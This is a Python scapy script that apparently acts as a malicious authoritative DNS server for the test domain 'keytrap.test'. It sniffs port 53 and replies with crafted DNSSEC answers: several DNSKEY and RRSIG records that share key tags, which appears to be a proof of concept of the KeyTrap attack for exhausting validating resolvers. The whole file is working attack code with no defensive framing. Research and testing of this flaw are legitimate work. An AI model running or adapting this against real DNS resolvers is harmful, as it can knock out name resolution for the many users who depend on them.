from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR, DNSRRRSIG, DNSRRDNSKEY
from scapy.layers.inet import IP, UDP
import time

# 配置DNS服务器的IP和端口
IFACE_LAN = "eth0"
PORT_OF_SERVER = "53"
DOMAIN_NAME = ["www.keytrap.test.", "keytrap.test.", "ns1.keytrap.test."]

# BPF过滤器
BPF_FILTER = "udp port " + PORT_OF_SERVER 

RRSIG={
    "www.keytrap.test.": "u3i18XgPPsVN7bQlmWvSqPx0wtzNgsmEGW8FQ21Qiot67v4/MjkY8H27la+5eJIjo+eYIo1FpuUa2wxZ0eHA8dWck7ek0KFH/oibMSzvDWPkVBMwLFpjiOiiJVN5sOtw",
    "keytrap.test.": "+XtSv7DeD9ASuujWbst5v73eq+pDGM0Qs27E9FahFTvJNVi6gOTQMoxnpCs0U8Way2Af8iP6OoKOfZY8RMrvsMI3k9JtGl1SKaztWA5vz9nVS/MhN1sOTIpkLU6Hvnfa",
    "ns1.keytrap.test.": "/iNOASO1o0PtfxvlLIkrq/hb+jJqhbJeAstiNmjj/Ck7jYvBg+0xUL/rAaN9+RpA/vqa7uxX8zaI2xutux1avqQvHYngyU9ETjJNu6G6sLCqLTOrDPhrjbiV1OyVWdu2",
}
    

# 构造DNS响应
def craft_dns_response(pkt, qname, qtype):
    reply_pkt = IP(src=pkt[IP].dst, dst=pkt[IP].src) / UDP(sport=int(PORT_OF_SERVER), dport=pkt[UDP].sport)
    
    # 查询A记录
    if qtype == 1:
        reply_pkt /= DNS(id=pkt[DNS].id, qr=1, aa=1, ad=1, qd=pkt[DNS].qd,
                        ancount=1, nscount=1, arcount=1,
                        an=
                            DNSRR(rrname=qname, type=1, ttl=60, rdata="1.2.3.4") / 
                            DNSRR(rrname=qname, type=1, ttl=60, rdata="1.2.3.5"),
                        ns=
                            DNSRR(rrname="keytrap.test.", type=2, ttl=60, rdata="ns1.keytrap.test.") /
                            DNSRRRSIG(rrname="keytrap.test.", keytag=6350, typecovered=2, signersname="keytrap.test", signature=RRSIG["keytrap.test."]),
                        ar=
                            DNSRR(rrname="ns1.keytrap.test.", type=1, ttl=60, rdata="1.2.3.4") /
                            DNSRRRSIG(rrname="ns1.keytrap.test.", keytag=6350, signersname="keytrap.test", signature=RRSIG["keytrap.test."]),
                    )

    # 查询DNSKEY记录
    elif qtype == 48:
        reply_pkt /= DNS(id=pkt[DNS].id, qr=1, aa=1, ad=1, qd=pkt[DNS].qd,
                    an=
                        DNSRRDNSKEY(rrname="keytrap.test.", algorithm=14, flags=257, publickey="MzJsFTtAo0j8qGpDIhEMnK4ImTyYwMwDPU5gt/FaXd6TOw6AvZDAj2hlhZvaxMXV6xCw1MU5iPv5ZQrb3NDLUU+TW07imJ5GD9YKi0Qiiypo+zhtL4aGaOG+870yHwuY") /
                        DNSRRDNSKEY(rrname="keytrap.test.", algorithm=14, flags=256, publickey="MjY4X0GT9jf00V9bZU7cMkceFGdUMgbeNK4afF6BB/VznyKXsZlTeX5IgrD/8BNWd1jMvvL5RlbBXbmy5022d34VqReK5IRA6WKxp9uzDBEpc6qoh2npdudDTsFMZKor") /
                        DNSRRRSIG(rrname="keytrap.test.", keytag=6350, typecovered=48, signersname="keytrap.test.", signature="RV1t5PrsLi9tSUYq9ZNtFoXT8cmJYVUzOsn7xYPItKC7ky7Kpqiykk6HJIcnU4yyMbY2eLVfdjUZFqu0dKl5yQnJvuVswc6ZvbWUtPc1ElbETHKve+MqGZagRPfwulLT") /
                        DNSRRRSIG(rrname="keytrap.test.", keytag=30130, typecovered=48, signersname="keytrap.test.", signature="n4xGxlkb2FsJ3/nSfPaznBYXM4lDbMXLcXvIuxMNoRwpkdoKgUDX1PcwxnPhVS8T8Pi9SFM7KdhEl6b0lj/wtZPJtEA1oncjoE5sC7atr66ncAIpt9XVkCufFpepA8P/"),
                )

    return reply_pkt

# 处理DNS查询请求
def dns_response(pkt):
    try:
        if DNS not in pkt:
            return

        qname = pkt[DNS].qd.qname.decode("utf-8")
        if qname not in DOMAIN_NAME:
            return

        qtype = pkt[DNS].qd.qtype
        print(f"{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())} : fm {pkt[IP].src}:{pkt[UDP].sport} : {qname} {qtype} ?")

        # 构建DNS响应
        resp = craft_dns_response(pkt, qname, qtype)
        resp.show2()
        send(resp, iface=IFACE_LAN)
        print(f"{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())} : to {pkt[IP].src}:{pkt[UDP].sport} : {qname}\n")

    except Exception as error:
        print("Error: ", error)

print("Start DNS Authority ...")
sniff(filter=BPF_FILTER, prn=dns_response, iface=IFACE_LAN)

# pkt = IP()/UDP()/DNS(rd=1, qd=DNSQR(qname="www.keytrap.test.", qtype=1))
# craft_dns_response(pkt, "www.keytrap.test.", 1).show2()
